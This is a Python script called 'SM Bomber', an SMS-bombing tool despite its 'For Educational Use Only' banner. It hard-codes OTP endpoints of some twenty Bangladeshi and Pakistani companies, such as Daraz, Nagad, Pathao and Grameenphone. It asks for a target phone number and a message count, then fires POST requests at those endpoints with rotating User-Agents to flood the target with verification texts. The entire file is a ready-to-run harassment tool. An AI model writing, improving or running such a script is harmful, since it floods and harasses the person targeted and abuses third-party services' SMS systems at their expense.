import requests
import json
import time
import random
import sys
import os

# ANSI escape codes for colors
class Colors:
    GREEN = '\033[92m'  # Green for success
    RED = '\033[91m'    # Red for failed
    YELLOW = '\033[93m' # Yellow for info
    CYAN = '\033[96m'   # Cyan for input
    RESET = '\033[0m'   # Reset color

# "SM" ASCII Art
SM_ART = f"""
{Colors.CYAN}


                                 _____ __  __ 
                                / ____|  \/  |
                               | (___ | \✨/ |
                                \___ \| |\/| |
                                ____) | |  | |
                               |_____/|_|  |_|
        
        
          {Colors.YELLOW}=== SM CORPORATE 🍁 SM Bomber ==={Colors.RESET}
          Coded by: SM 🍁 
          For Educational Use Only!
"""

# All APIs (including Bangladeshi and Pakistani services)
APIs = [
    {"name": "Ostad OTP", "url": "https://ostad.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Chaldal OTP", "url": "https://chaldal.com/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Sheba.xyz OTP", "url": "https://sheba.xyz/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Bikroy OTP", "url": "https://bikroy.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Daraz OTP", "url": "https://daraz.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Nagad OTP", "url": "https://www.nagad.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Pathao OTP", "url": "https://pathao.com/api/otp/send", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Foodpanda OTP", "url": "https://www.foodpanda.com.bd/api/v2/otp/send", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Pickaboo OTP", "url": "https://www.pickaboo.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "ShopUp OTP", "url": "https://www.shopup.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Meena Bazar OTP", "url": "https://meenabazar.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "PriyoShop OTP", "url": "https://www.priyoshop.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Evaly OTP", "url": "https://evaly.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "AjkerDeal OTP", "url": "https://ajkerdeal.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Daraz Pakistan OTP", "url": "https://daraz.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Viber OTP", "url": "https://viber.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "EasyPaisa OTP", "url": "https://www.easypaisa.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Telenor OTP", "url": "https://www.telenor.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Jazz OTP", "url": "https://www.jazz.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Grameenphone OTP", "url": "https://grameenphone.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
    {"name": "Robi OTP", "url": "https://robi.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
]

# Random User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def validate_phone(phone):
    return phone.isdigit() and len(phone) == 11 and phone.startswith("01")

def send_request(api, phone):
    url = api["url"]
    data = json.loads(json.dumps(api["data"]).replace("{number}", phone))
    headers = {
        "Content-Type": "application/json",
        "User-Agent": random.choice(USER_AGENTS),
    }

    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
        if response.status_code < 400:
            return {"success": True, "status": "Success"}
        else:
            return {"success": False, "status": "Failed"}
    except requests.RequestException:
        return {"success": False, "status": "Failed"}

def main():
    clear_screen()
    print(SM_ART)
    
    # Phone number input
    phone = input(f"{Colors.CYAN}Enter Bangladeshi number (e.g., 01712345678): {Colors.RESET}").strip()
    if not validate_phone(phone):
        print(f"{Colors.RED}Invalid number! Must be 11 digits starting with 01.{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Message count input
    try:
        count = int(input(f"{Colors.CYAN}Enter number of messages (1-100): {Colors.RESET}").strip())
        if not 1 <= count <= 100:
            raise ValueError
    except ValueError:
        print(f"{Colors.RED}Invalid count! Must be between 1 and 100.{Colors.RESET}")
        input("Press Enter to exit...")
        return

    # Delay input
    try:
        delay = float(input(f"{Colors.CYAN}Enter delay between requests (seconds, e.g., 2): {Colors.RESET}").strip())
        if delay < 0:
            raise ValueError
    except ValueError:
        print(f"{Colors.RED}Invalid delay! Must be a non-negative number.{Colors.RESET}")
        input("Press Enter to exit...")
        return

    print(f"\n{Colors.YELLOW}Starting SMS bombing to {phone} with {count} messages (delay: {delay}s)...{Colors.RESET}")

    for i in range(count):
        api = random.choice(APIs)  # Randomly select an API for each message
        result = send_request(api, phone)
        if result["success"]:
            print(f"{Colors.GREEN}[{i+1}/{count}] {api['name']}: Success{Colors.RESET}")
        else:
            print(f"{Colors.RED}[{i+1}/{count}] {api['name']}: Failed{Colors.RESET}")
        time.sleep(delay + random.uniform(0, 1))  # Delay + random 0-1s

    print(f"\n{Colors.GREEN}SMS bombing completed successfully!{Colors.RESET}")
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Stopped by user.{Colors.RESET}")
        sys.exit(0)
